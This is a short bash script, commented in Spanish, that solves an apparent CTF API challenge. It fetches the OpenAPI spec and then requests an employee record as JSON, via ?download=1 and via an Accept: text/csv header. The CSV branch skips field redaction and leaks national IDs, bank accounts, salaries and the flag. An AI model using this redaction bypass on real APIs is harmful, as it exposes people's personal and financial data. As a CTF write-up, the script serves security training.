#!/bin/bash
# Export Controls (Fluid Attacks CTF 2026, API) -- excessive data exposure por ruta de export CSV.
# Uso:    ./export_controls_csv_dump.sh <base_url> [id]
# Ejemplo: ./export_controls_csv_dump.sh https://9e134cb23ddc157b.chal.ctf.ae 1
#
# El JSON aplica whitelist (schema EmployeePublic); el export CSV es otra rama de codigo (patron
# FastAPI: dos Response para la misma ruta) que vuelca el modelo completo (national_id, bank_account,
# annual_salary, compensation_note con la flag). Recon: /openapi.json lo documenta casi literal.

BASE="${1:?base_url}"
ID="${2:-1}"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

echo "[*] 0) spec (sin /docs pero /openapi.json sigue servido)"
curl -sk -A "$UA" "$BASE/openapi.json" | (jq . 2>/dev/null || cat) | head -40; echo

echo "[*] 1) JSON (recortado por EmployeePublic):"
curl -sk -A "$UA" "$BASE/api/employees/$ID"; echo

echo "[*] 2) CSV via ?download=1 (se salta la redaccion):"
curl -sk -A "$UA" "$BASE/api/employees/$ID?download=1"; echo

echo "[*] 3) CSV via Accept header (variante):"
curl -sk -A "$UA" -H 'Accept: text/csv' "$BASE/api/employees/$ID"; echo
